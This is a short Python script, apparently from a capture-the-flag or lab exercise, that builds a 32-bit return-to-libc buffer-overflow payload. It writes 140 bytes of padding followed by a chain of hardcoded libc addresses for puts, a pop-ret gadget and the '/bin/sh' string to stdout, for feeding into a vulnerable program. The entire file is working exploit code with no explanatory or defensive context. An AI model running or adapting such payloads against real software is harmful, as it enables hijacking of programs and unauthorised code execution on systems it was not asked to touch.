import struct
import sys

base_libc = 0xf7ded000
offset_system = 0x0003cd10
offset_puts = 0x00067360
offset_shell = 0x0017b8cf 
offset_popret = 0x0001869b
bufsize = 140

def main():
    buf = b'A' * bufsize
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += b'AAAA'
    buf += struct.pack('<I', base_libc + offset_shell)

    sys.stdout.buffer.write(buf)



if __name__ == "__main__":
    main()
